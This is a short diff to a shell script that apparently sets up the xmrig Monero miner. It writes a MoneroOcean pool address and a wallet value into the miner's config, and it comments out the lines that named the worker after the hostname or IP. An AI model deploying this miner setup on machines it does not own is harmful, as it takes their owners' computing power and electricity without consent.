@@ -210,16 +210,16 @@ fi
 
 echo "[*] Miner $HOME/moneroocean/xmrig is OK"
 
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-if [ "$PASS" == "localhost" ]; then
-  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#if [ "$PASS" == "localhost" ]; then
+#  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+#fi
+#if [ -z $PASS ]; then
+#  PASS=na
+#fi
+#if [ ! -z $EMAIL ]; then
+#  PASS="$PASS:$EMAIL"
+#fi
 
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
